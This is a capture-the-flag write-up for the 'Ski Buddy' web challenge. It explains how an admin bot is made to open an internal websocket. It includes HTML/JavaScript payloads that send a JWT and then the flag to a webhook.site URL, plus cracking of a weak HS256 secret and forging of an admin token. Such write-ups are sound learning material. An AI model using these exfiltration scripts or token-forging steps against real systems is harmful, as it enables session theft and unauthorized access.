# [WEB] Ski Buddy
## Description
It is important to get the latest updates while skiing.

Author: jro

http://challs.nusgreyhats.org:33335

## The Webpage
When we visit the URL, we arrive at a website that displays live skiing alerts, as well as a single input box that allows us to enter a URL that will be reviewed by some kind of admin bot.

![Webpage](./images/webpage.png)

## Code Analysis
We are given the source code for this challenge. While the large amounts of source code might seem daunting especially if you are a newer player, the relevant logic for solving this challenge actually only constitutes a small portion, that is, the `handle_websocket()` function in `app.py`.

In summary, a high-level overview of the website's functionality as follows:
1. When we submit a URL, the `submit_news()` function is invoked within `app.py`, connecting to the admin bot via a net socket.
2. Upon receiving data on the socket, the `visitSubmission()` function in `bot.js` is called, spawning a headless browser and visiting the supplied URL.

Yea, as simple as it seems, that's literally it. Unless we look closer at the `handle_websocket()` function, we will not be getting anywhere. Let us now do a breakdown of the function.

Unlike the aforementioned functions, `handle_websocket()` does not link to the web form. Hence, it is always important to read the source code to uncover hidden functionalities. This function is only called if we visit the `/ws` endpoint.

```python
secret = os.environ.get('JWT_SECRET', os.urandom(32).hex())
payload = {
    "username": "guest",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600  # expires in 1 hour
}
token = jwt.encode(payload, secret, algorithm="HS256")
ws.send(json.dumps({"type": "token", "token": token}))
```

From this code block, we see that a JWT token is created and sent to the client when a socket connection is established. The username attached to this token is `guest`.

```python
while True:
    try:
        message = ws.receive()
        data = json.loads(message)
        if data.get("type") == "auth":
            token = data.get("token")
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                username = decoded.get("username", "guest")
                ws.send(json.dumps({"type": "auth_success", "username": username}))
                if username == "admin":
                    if request.remote_addr == ADMIN_HOST:
                        ws.send(json.dumps({"type": "flag", "message": os.environ.get('FLAG', 'No flag set')}))
                    else:
                        ws.send(json.dumps({"type": "flag", "error": "Unauthorized flag access from IP: " + request.remote_addr}))
            except jwt.ExpiredSignatureError:
                ws.send(json.dumps({"type": "auth_error", "error": "Token expired"}))
            except jwt.InvalidTokenError:
                ws.send(json.dumps({"type": "auth_error", "error": "Invalid token"}))
    except ConnectionClosed:
        break
    except:
        break
```

In the code block above, we can identify the "schema" required for the payload when we abuse the endpoint later on.
- `json.loads(message)` indicates that we need to send JSON data over.
- `data.get("type") == "auth"` indicates that our JSON data should contain the `type` property with a value of `auth`.
- `jwt.decode(token, secret, algorithms=["HS256"])` indicates that the JWT algorithm used here is `HS256`.
- `if username == "admin"` indicates us that our JWT payload should contain the `username` property with a value of `admin`. This is note-worthy as the JWT token we receive (shown in the previous code block) has a username value of `guest`. This means that we will need to alter the intercepted JWT token.
- `if request.remote_addr == ADMIN_HOST` indicates that the one sending the websocket requests should be the admin bot, not us.

## A Step At A Time
We know that the admin bot should be the one interacting with the websocket endpoint, but how do we do it? I **STRONGLY** suggest running the application locally for clarity sake. By running the application locally, we can add our own `print()` statements and debugging information within the source code to help us better understand how our data is being handled, which if-else branches are being taken, etc.

The author has kindly provided us with a `compose.yaml` file, so all we need to do is to run `sudo docker-compose up --build` (after we bomb the entire source code with a bunch of `print()` functions, obviously). I usually like to add `print()` statements whenever a "significant" event occurs (e.g. if-else branch, data received, data uploaded, etc.)

```python
while True:
    try:
        message = ws.receive()
        data = json.loads(message)
        print(f"Received message: {data}")
        if data.get("type") == "auth":
            token = data.get("token")
            print(f"Received token: {token}")
            try:
                decoded = jwt.decode(token, secret, algorithms=["HS256"])
                print(f"Decoded token: {decoded}")
                username = decoded.get("username", "guest")
                ws.send(json.dumps({"type": "auth_success", "username": username}))
                if username == "admin":
                    if request.remote_addr == ADMIN_HOST:
                        print(f"Admin access granted for IP: {request.remote_addr}")
                        ws.send(json.dumps({"type": "flag", "message": os.environ.get('FLAG', 'No flag set')}))
                    else:
                        print(f"Unauthorized admin access attempt from IP: {request.remote_addr}")
                        ws.send(json.dumps({"type": "flag", "error": "Unauthorized flag access from IP: " + request.remote_addr}))
                print(f"User {username}")
            except jwt.ExpiredSignatureError:
                print("Token expired")
                ws.send(json.dumps({"type": "auth_error", "error": "Token expired"}))
            except jwt.InvalidTokenError:
                print("Invalid token")
                ws.send(json.dumps({"type": "auth_error", "error": "Invalid token"}))
```

I am running the code on WSL2, running the Kali operating system. After running docker compose, I can access the website through my host's (Windows 11) browser:

![Local Webpage](./images/local_webpage.png)

Let us try submitting `ws://ski-buddy-app:8000/ws`* as the URL:

![Unknown URL Scheme](./images/unknown_url_scheme.png)

Notice that we get the `ERR_UNKNOWN_URL_SCHEME` error, so it is likely that we can only use protocols like `HTTP` and `HTTPS`.

* Note: I use `ski-buddy-app` as the host as inferred from the `compose.yaml` file:

```
services:
  ski_buddy_app:
    container_name: ski-buddy-app
    build:
      context: ski-buddy
      dockerfile: Dockerfile
    restart: always
    ports:
      - "33335:8000"
```

So how do we get the admin bot to run code then? Well, to solve that issue, we should create a HTML file containing a JavaScript code, host the file, and get the admin bot to visit it. For now, we will create a file called `test.html` and host it (locally) using `python3 -m http.server`.

The following are the contents of the HTML file that we use. We can use [webhook.site](https://webhook.site/) to serve as a proxy for communications and as a place to collect our data.

```html
<script>
    const ws = new WebSocket('ws://ski-buddy-app:8000/ws'); // Use Docker service name
    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);

        if (data.type === "token") {
            fetch("https://webhook.site/bbd240d1-8cc3-43ac-a0aa-1b8251864662?data=" + encodeURIComponent(data.token));
        }

    };
</script>
```

We will then enter `http://<IP_ADDRESS>:8000/test.html` as the URL for the admin bot to scour. In my case, `<IP_ADDRESS>` is my Kali's eth0 IP address, which I am using to host the Python web server module. We will then get a response similar to the following in webhook.site:

![Local JWT](./images/local_jwt.png)

We can copy this token, but we cannot use it yet, as we have observed previously that the `guest` username is tied to the token instead of `admin`. We can verify this through [online JWT debuggers](https://jwt.lannysport.net/):

![Verifying Guest JWT](./images/verifying_guest_jwt.png)

Before we go about editing the `username` variable, we need to know what `JWT_SECRET` is. So, we will need to replicate every step that we just did, but on the live CTF server. For my case, I used [Netlify](https://www.netlify.com/) to host my `test.html` file, as I find it to be quick and easy (literally just drag and drop a folder containing the `test.html` file and we are good to go). On the actual webpage, I then entered the hosted file's URL, which in my case, was `https://famous-travesseiro-47e110.netlify.app/test.html`. My webhook then got a new request containing the JWT token signed using the actual secret: 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaWF0IjoxNzU1MzMzODE4LCJleHAiOjE3NTUzMzc0MTh9.LLFazgdeXGnuKOKKNPOIxXo5TIEBlt15ekMCkfrA-2w
```

Now, we need to crack the JWT signing secret. For that, my teammate [x44ylan](https://github.com/Dylan-Liew) linked me to the tool [jwt2john.py](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py).

![JWT Secret Cracked](./images/jwt_secret_cracked.png)

We can then identify the JWT secret to be `t0ilet`. With this information, we just need to modify the `username` property to contain `admin` as a value, and sign the key using `t0ilet`.

![Signed JWT](./images/signed_jwt.png)

Now, we just need to modify the `test.html` file previously to send the new JWT token over:

```html
<script>
    const ws = new WebSocket('ws://ski-buddy-app:8000/ws');
    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);

        if (data.type === "token") {
            ws.send(JSON.stringify({ type: "auth", token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.lDM0EwlIImPfZa_Yx2-j9-StPLJEuTYHFjK_ukbnjbg" }));
        }
        
        if (data.type === "flag") {
            fetch("https://webhook.site/bbd240d1-8cc3-43ac-a0aa-1b8251864662?flag=" + encodeURIComponent(data.message));
        }
    };
</script>
```

Afterwards, we just need to host the updated HTML file and have the admin bot visit it to get our flag via the webhook:

![Flag](./images/flag_revealed.png)

**Flag:** `grey{skibidi_toilet_2ea989edfabfe44f526d7edd0dd8df27}`

HTML File: [socket.html](https://raw.githubusercontent.com/0necloud/CTF-Writeups/refs/heads/main/Greyhats%20Welcome%20CTF%202025/Ski%20Buddy/socket.html)